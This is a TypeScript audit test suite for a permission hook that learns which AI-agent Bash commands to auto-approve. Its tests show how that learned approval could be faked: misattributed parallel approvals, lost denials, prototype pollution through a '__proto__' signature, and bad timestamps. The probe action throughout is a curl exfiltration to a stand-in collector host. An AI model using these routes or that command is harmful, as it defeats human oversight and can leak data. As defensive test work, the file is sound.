/**
 * Audit: concurrency and state.
 *
 * Every test in this file is EXPECTED TO FAIL against the current code. They
 * are the specification for the fix, not a description of today's behaviour.
 *
 * The common shape: the decision engine itself is sound, but the *state* it
 * decides from can be manufactured, mis-attributed, raced away, or erased —
 * and every one of those routes ends in `allow`.
 */

import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import type { Action, Config, Envelope, Request } from '../src/core/types.js';
import { decide } from '../src/core/decide.js';
import {
  DEFAULT_THRESHOLDS,
  canPromote,
  familiarity,
  newEnvelope,
  newSession,
  observe,
} from '../src/core/envelope.js';
import { analyze } from '../src/core/classify.js';
import { DEFAULT_CONFIG, loadEnvelope, saveEnvelope } from '../src/store/index.js';
import { findProjectRoot, projectKey } from '../src/core/paths.js';

/** The envelope key the hook will compute for a cwd. */
const realKey = (cwd: string): string => projectKey(findProjectRoot(cwd));

const WORKSPACE = path.join(os.tmpdir(), 'leastgrant-audit-state-ws');
fs.mkdirSync(path.join(WORKSPACE, '.git'), { recursive: true });

const DAY = 86_400_000;
const T0 = Date.UTC(2026, 0, 5, 10, 0, 0);
const config: Config = { ...DEFAULT_CONFIG, thresholds: { ...DEFAULT_THRESHOLDS }, rules: [] };

/**
 * The action under test throughout: an arbitrary outbound fetch to a host the
 * attacker chose. Blast tier 2, trips no floor, so it is exactly the band where
 * learned promotion is allowed to operate — which makes it the right probe for
 * "did the evidence that promoted it actually exist?".
 */
const CMD = 'curl https://collector.example.com/p';

function actionFor(cmd: string): Action {
  const a = analyze(
    { agent: 't', tool: 'Bash', input: { command: cmd }, cwd: WORKSPACE, sessionId: 's', at: T0 },
    { roots: [WORKSPACE], secretPatterns: [] },
  );
  return a.actions[0]!;
}

function judge(env: Envelope, cmd: string, at: number) {
  const req: Request = {
    agent: 't',
    tool: 'Bash',
    input: { command: cmd },
    cwd: WORKSPACE,
    sessionId: 'live',
    at,
  };
  return decide(req, {
    roots: [WORKSPACE],
    secretPatterns: [],
    config,
    envelope: env,
    session: newSession('live', at),
    stateDir: path.join(os.tmpdir(), 'leastgrant-audit-state-home'),
    projectKey: WORKSPACE,
  });
}

function fold(
  env: Envelope,
  action: Action,
  evidence: 'confirmed' | 'denied' | 'observed',
  at: number,
  sessionId: string,
): void {
  observe(
    env,
    {
      signature: action.signature,
      capability: action.capability,
      blast: action.blast,
      evidence,
      at,
      sessionId,
      display: action.display,
    },
    DEFAULT_THRESHOLDS,
  );
}

// ---------------------------------------------------------------------------
// 1. Evidence must be attributed to the tool call it belongs to.
//
//    Claude Code issues tool calls in parallel. hook.ts used to store exactly
//    one `pending` record per session and never checked `tool_use_id` on the
//    way back out, so the PostToolUse of a benign, auto-allowed call folded the
//    *other* call's signature — and labelled it `confirmed`, i.e. "a human said
//    yes", because that other call's verdict was `ask`. An action the human was
//    still being prompted about accrued human-grade approvals it never got.
//
//    This is now driven through the real hook binary, over real stdin, with a
//    real state directory. An earlier version of this file modelled the
//    interleaving in a local function; that function reproduced the bug by
//    construction and kept reporting it after the adapter was fixed, which is
//    the failure mode an audit can least afford.
// ---------------------------------------------------------------------------

const HOOK_HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'lg-hookattr-'));
const CLI = path.resolve('bin/leastgrant.js');

function hook(event: 'PreToolUse' | 'PostToolUse', body: Record<string, unknown>): string {
  const r = spawnSync(process.execPath, [CLI, 'hook'], {
    input: JSON.stringify({ hook_event_name: event, cwd: WORKSPACE, ...body }),
    encoding: 'utf8',
    env: { ...process.env, LEASTGRANT_HOME: HOOK_HOME },
  });
  return r.stdout ?? '';
}

describe('audit/state: evidence attribution across parallel tool calls', () => {
  // Two calls in flight at once, as Claude Code actually issues them: a benign
  // one that finishes immediately, and the exfiltration the human is being
  // prompted about. Repeated enough times to clear every promotion gate if the
  // approvals were being credited to the wrong signature.
  test('a call the human was only prompted about earns no approvals', () => {
    const sid = 'parallel-session';
    for (let day = 0; day < 3; day++) {
      for (let i = 0; i < 12; i++) {
        const benignId = `tu_benign_${day}_${i}`;
        const targetId = `tu_target_${day}_${i}`;
        hook('PreToolUse', { session_id: sid, tool_name: 'Bash', tool_input: { command: 'ls -la' }, tool_use_id: benignId, permission_mode: 'default' });
        hook('PreToolUse', { session_id: sid, tool_name: 'Bash', tool_input: { command: CMD }, tool_use_id: targetId, permission_mode: 'default' });
        // Only the benign call comes back. The prompt for the other one is
        // still open, or was refused — either way it never reaches Post.
        hook('PostToolUse', { session_id: sid, tool_name: 'Bash', tool_input: { command: 'ls -la' }, tool_use_id: benignId, permission_mode: 'default' });
      }
    }

    const env = JSON.parse(
      fs.readFileSync(
        path.join(HOOK_HOME, 'envelopes', createHash('sha256').update(realKey(WORKSPACE)).digest('hex').slice(0, 16) + '.json'),
        'utf8',
      ),
    ) as Envelope;

    const target = actionFor(CMD);
    const stat = env.signatures[target.signature];
    assert.equal(
      stat?.confirmed ?? 0,
      0,
      `the benign call's PostToolUse credited its outcome to ${target.signature}`,
    );

    // And the decision the user would actually get.
    const out = hook('PreToolUse', { session_id: 'fresh', tool_name: 'Bash', tool_input: { command: CMD }, tool_use_id: 'tu_final', permission_mode: 'default' });
    const decision = out ? (JSON.parse(out) as { hookSpecificOutput?: { permissionDecision?: string } }).hookSpecificOutput?.permissionDecision : undefined;
    assert.notEqual(decision, 'allow', `zero human approvals were given for "${CMD}", yet the hook said allow`);
  });

  // The benign call's own evidence still lands, on its own signature. A fix
  // that attributed nothing at all would pass the test above and break
  // learning entirely.
  test('the benign call is still credited, on its own signature', () => {
    const env = JSON.parse(
      fs.readFileSync(
        path.join(HOOK_HOME, 'envelopes', createHash('sha256').update(realKey(WORKSPACE)).digest('hex').slice(0, 16) + '.json'),
        'utf8',
      ),
    ) as Envelope;
    const benign = actionFor('ls -la');
    const stat = env.signatures[benign.signature];
    assert.ok((stat?.totalSeen ?? 0) > 0, `nothing was learned for ${benign.signature}`);
  });
});

// ---------------------------------------------------------------------------
// 2. Denials are permanent, including across concurrent writers and state loss.
//
//    `observe(evidence:'denied')` used to be written into a file that every
//    hook process rewrote wholesale, with no locking and no compare-and-swap.
//    Any load-modify-save that straddled a denial write reverted it — and the
//    engine documents denials as permanent.
//
//    These tests now go through the real store: `saveEnvelope` merges against
//    what is on disk and journals every denial to `denials.jsonl`, and
//    `loadEnvelope` replays that journal. An earlier version asserted against
//    two in-memory envelopes and a comment reading `// last writer wins`, which
//    tested the modelling, not the store.
// ---------------------------------------------------------------------------

describe('audit/state: a denial cannot be lost', () => {
  const STORE_HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'lg-denials-'));
  const withStore = <T>(fn: () => T): T => {
    const prev = process.env['LEASTGRANT_HOME'];
    process.env['LEASTGRANT_HOME'] = STORE_HOME;
    try {
      return fn();
    } finally {
      if (prev === undefined) delete process.env['LEASTGRANT_HOME'];
      else process.env['LEASTGRANT_HOME'] = prev;
    }
  };

  test('a concurrent save cannot revert a recorded denial', () => {
    withStore(() => {
      const action = actionFor(CMD);

      // A well-established signature.
      const first = newEnvelope('project', WORKSPACE);
      for (let i = 0; i < 14; i++) fold(first, action, 'confirmed', T0 + (i % 2) * DAY + i * 1000, `s${i % 2}`);
      saveEnvelope(first);

      // t1: an in-flight hook process loads the envelope.
      const inFlight = loadEnvelope('project', WORKSPACE);

      // t2: another process records three refusals and saves.
      const mining = loadEnvelope('project', WORKSPACE);
      for (let i = 0; i < 3; i++) fold(mining, action, 'denied', T0 + 2 * DAY + i * 1000, 'mined');
      saveEnvelope(mining);
      assert.equal(judge(loadEnvelope('project', WORKSPACE), CMD, T0 + 3 * DAY).decision, 'ask', 'precondition: the denial blocks');

      // t3: the hook from t1 finishes and saves the copy it loaded, which has
      // no knowledge of the refusals.
      fold(inFlight, action, 'observed', T0 + 3 * DAY, 'live');
      saveEnvelope(inFlight);

      assert.notEqual(
        judge(loadEnvelope('project', WORKSPACE), CMD, T0 + 3 * DAY).decision,
        'allow',
        'a denial was lost to a concurrent write and the action became auto-approved',
      );
    });
  });

  test('a denial survives the envelope file being destroyed', () => {
    withStore(() => {
      const action = actionFor(CMD);
      const env = loadEnvelope('project', WORKSPACE);
      for (let i = 0; i < 4; i++) fold(env, action, 'denied', T0 + 2 * DAY + i * 1000, 's0');
      saveEnvelope(env);

      // The envelope becomes unreadable: a truncated write, a bad disk, a
      // hand edit, `rm`. loadEnvelope cannot tell that from "no envelope yet".
      const file = path.join(
        STORE_HOME,
        'envelopes',
        createHash('sha256').update(WORKSPACE).digest('hex').slice(0, 16) + '.json',
      );
      fs.writeFileSync(file, '{ this is not json');

      // The human then re-approves the action a dozen times, as they eventually
      // will, over two days and two sessions.
      const after = loadEnvelope('project', WORKSPACE);
      for (let i = 0; i < 12; i++) fold(after, action, 'confirmed', T0 + (3 + (i % 2)) * DAY + i * 1000, `t${i % 2}`);
      saveEnvelope(after);

      assert.notEqual(
        judge(loadEnvelope('project', WORKSPACE), CMD, T0 + 6 * DAY).decision,
        'allow',
        'the recorded refusals were erased by state loss, so "a no does not expire" no longer holds',
      );
    });
  });
});

// ---------------------------------------------------------------------------
// 3. `observe()` writes through the prototype chain.
//
//    `env.signatures[sig]` is agent-keyed (signatures are built from argv), and
//    `observe` treats a truthy lookup as an existing record without checking
//    that it is an OWN property. For `sig === '__proto__'` that record is
//    `Object.prototype`, so the fields are written onto every object in the
//    process. `grantedAt` is the lethal one: `familiarity()` copies it out for
//    any stat that lacks its own, and `canPromote()` treats it as a standing
//    human attestation that bypasses minConfirmed / minDays / minSessions.
// ---------------------------------------------------------------------------

describe('audit/state: prototype-shaped signatures (EXPECTED TO FAIL)', () => {
  test('observe() does not write onto Object.prototype', () => {
    const env = newEnvelope('project', WORKSPACE);
    const action = actionFor(CMD);
    try {
      observe(env, {
        signature: '__proto__',
        capability: action.capability,
        blast: action.blast,
        evidence: 'granted',
        at: T0,
        sessionId: 'x',
        display: '__proto__',
      });
    } catch {
      /* it also throws; the writes that precede the throw are the problem */
    }
    const polluted = ['grantedAt', 'confirmed', 'observed', 'denied', 'totalSeen', 'firstSeen', 'lastSeen']
      .filter((k) => Object.prototype.hasOwnProperty.call(Object.prototype, k));
    // Clean up regardless, so the rest of the suite is not affected.
    for (const k of polluted) delete (Object.prototype as Record<string, unknown>)[k];
    assert.deepEqual(polluted, [], `agent-chosen signature wrote ${polluted.join(', ')} onto Object.prototype`);
  });

  test('a polluted grantedAt does not auto-approve an unseen signature', () => {
    (Object.prototype as Record<string, unknown>)['grantedAt'] = T0;
    try {
      const action = actionFor(CMD);
      const env = newEnvelope('project', WORKSPACE);
      env.signatures[action.signature] = {
        signature: action.signature,
        capability: action.capability,
        confirmed: 0,
        denied: 0,
        observed: 0,
        totalSeen: 1,
        firstSeen: T0,
        lastSeen: T0,
        sessions: 0,
        days: 0,
        worstBlast: action.blast,
        samples: [],
      };
      const fam = familiarity(env, {
        signature: action.signature,
        capability: action.capability,
        blast: action.blast,
        at: T0,
      });
      // Note the assertion is about the *consequence*, not about
      // `fam.grantedAt` being undefined. `fam` is an ordinary object literal,
      // so reading a field off it from here goes through the same polluted
      // prototype the engine has to defend against, and the test could never
      // observe a difference. What matters is that nothing downstream treats
      // the inherited value as a standing human grant.
      assert.equal(
        canPromote(fam, action.blast).eligible,
        false,
        'canPromote read grantedAt off the prototype and skipped every gate',
      );
      assert.notEqual(judge(env, CMD, T0).decision, 'allow');
      // The same for a signature with real evidence behind it but short of the
      // day and session spread: pollution must not buy the shortcut.
      const partial = newEnvelope('project', WORKSPACE);
      for (let i = 0; i < 30; i++) fold(partial, action, 'confirmed', T0 + i * 1000, 'one-session');
      assert.notEqual(judge(partial, CMD, T0 + 60_000).decision, 'allow');
    } finally {
      delete (Object.prototype as Record<string, unknown>)['grantedAt'];
    }
  });
});

// ---------------------------------------------------------------------------
// 4. Clock handling. `mine.ts` folds a record whose timestamp will not parse at
//    `at = 0`, which the day counter reads as a genuine second calendar day —
//    defeating `minDays`, the gate whose stated job is to stop one long day's
//    work from teaching a habit. And a `lastSeen` that is NaN or in the future
//    switches decay off permanently.
// ---------------------------------------------------------------------------

describe('audit/state: clock (EXPECTED TO FAIL)', () => {
  test('an unparseable timestamp does not manufacture a distinct day', () => {
    const action = actionFor(CMD);
    const env = newEnvelope('project', WORKSPACE);
    for (let i = 0; i < 14; i++) fold(env, action, 'confirmed', T0 + i * 1000, `s${i % 2}`);
    assert.equal(env.signatures[action.signature]?.days, 1, 'precondition: one calendar day');
    fold(env, action, 'confirmed', 0, 's0'); // Date.parse('') || 0
    assert.equal(
      env.signatures[action.signature]?.days,
      1,
      'a record that failed to parse its timestamp counted as a second day of use',
    );
  });

  test('a lastSeen in the future does not disable decay', () => {
    const action = actionFor(CMD);
    const env = newEnvelope('project', WORKSPACE);
    for (let i = 0; i < 14; i++) fold(env, action, 'confirmed', T0 + (i % 2) * DAY + i * 1000, `s${i % 2}`);
    const stat = env.signatures[action.signature]!;
    const honest = judge(env, CMD, T0 + 900 * DAY).decision;
    assert.equal(honest, 'ask', 'precondition: two-and-a-half-year-old approvals have decayed away');
    stat.lastSeen = T0 + 1000 * DAY; // one machine with a wrong clock, or a mined future timestamp
    assert.notEqual(
      judge(env, CMD, T0 + 900 * DAY).decision,
      'allow',
      'a future lastSeen froze the evidence so it never expires',
    );
  });
});
